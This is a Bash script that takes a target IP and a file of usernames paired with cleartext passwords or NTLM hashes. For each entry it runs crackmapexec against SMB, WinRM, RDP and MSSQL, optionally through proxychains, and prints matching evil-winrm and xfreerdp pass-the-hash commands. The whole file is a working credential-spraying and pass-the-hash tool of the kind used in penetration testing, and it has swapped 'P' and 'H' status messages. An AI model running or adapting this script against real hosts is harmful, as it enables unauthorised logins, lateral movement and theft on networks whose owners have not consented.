#!/bin/bash
# File format:  USERNAME:P:PASSWORD   or   USERNAME:H:HASH

# Check if enough command line arguments are provided
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <IP> <Proxy: Y or N> <File path>"
    exit 1
fi

# Assign command line arguments to variables
IP="$1"
Proxy="$2"
file_path="$3"

# Check if the file exists
if [ ! -f "$file_path" ]; then
    echo "File not found: $file_path"
    exit 1
fi

# Read the file line by line and add to an array
mapfile -t lines < "$file_path"

# Loop through the array
for line in "${lines[@]}"; do
    # Extract the parts of the line
    parts=($(echo "$line" | tr ':' ' '))
    username="${parts[0]}"
    identifier="${parts[1]}"
    pass_hash="${parts[2]}"

    # Perform different actions based on the middle part
    if [ "$identifier" = "P" ]; then
        echo "Processing line with 'H': $line"
        if [ "$Proxy" = "N" ]; then
            echo "crackmapexec smb $IP -u $username -p $pass_hash"
            crackmapexec smb "$IP" -u "$username" -p "$pass_hash"
            echo "crackmapexec winrm $IP -u $username -p $pass_hash"
            echo "evil-winrm -i $IP -u $username -p $pass_hash"
            crackmapexec winrm "$IP" -u "$username" -p "$pass_hash"
            echo "crackmapexec rdp $IP -u $username -p $pass_hash"
            echo "xfreerdp /v:$IP /u:$username /p:$pass_hash"
            crackmapexec rdp "$IP" -u "$username" -p "$pass_hash"
            crackmapexec mssql "$IP" -u "$username" -p "$pass_hash"
        else
            echo "proxychains crackmapexec smb $IP -u $username -p $pass_hash"
            proxychains crackmapexec smb "$IP" -u "$username" -p "$pass_hash"
            echo "proxychains crackmapexec winrm $IP -u $username -p $pass_hash"
            echo "proxychains evil-winrm -i $IP -u $username -p $pass_hash"
            proxychains crackmapexec winrm "$IP" -u "$username" -p "$pass_hash"
            echo "proxychains crackmapexec rdp $IP -u $username -p $pass_hash"
            echo "proxychains xfreerdp /v:$IP /u:$username /p:$pass_hash"
            proxychains crackmapexec rdp "$IP" -u "$username" -p "$pass_hash"
            proxychains crackmapexec mssql "$IP" -u "$username" -p "$pass_hash"
        fi
    elif [ "$identifier" = "H" ]; then
        echo "Processing line with 'P': $line"
        if [ "$Proxy" = "N" ]; then
            echo "crackmapexec smb $IP -u $username -H $pass_hash"
            crackmapexec smb "$IP" -u "$username" -H "$pass_hash"
            echo "crackmapexec winrm $IP -u $username -H $pass_hash"
            echo "evil-winrm -i $IP -u $username -H $pass_hash"
            crackmapexec winrm "$IP" -u "$username" -H "$pass_hash"
            echo "crackmapexec rdp $IP -u $username -H $pass_hash"
            echo "xfreerdp /v:$IP /u:$username /pth:$pass_hash"
            crackmapexec rdp "$IP" -u "$username" -H "$pass_hash"
            crackmapexec mssql "$IP" -u "$username" -H "$pass_hash"
        else
            echo "proxychains crackmapexec smb $IP -u $username -H $pass_hash"
            proxychains crackmapexec smb "$IP" -u "$username" -H "$pass_hash"
            echo "proxychains crackmapexec winrm $IP -u $username -H $pass_hash"
            echo "proxychains evil-winrm -i $IP -u $username -H $pass_hash"
            proxychains crackmapexec winrm "$IP" -u "$username" -H "$pass_hash"
            echo "proxychains crackmapexec rdp $IP -u $username -H $pass_hash"
            echo "proxychains xfreerdp /v:$IP /u:$username /pth:$pass_hash"
            proxychains crackmapexec rdp "$IP" -u "$username" -H "$pass_hash"
            proxychains crackmapexec mssql "$IP" -u "$username" -H "$pass_hash"
        fi
    else
        echo "Unknown middle part: $identifier"
    fi
done
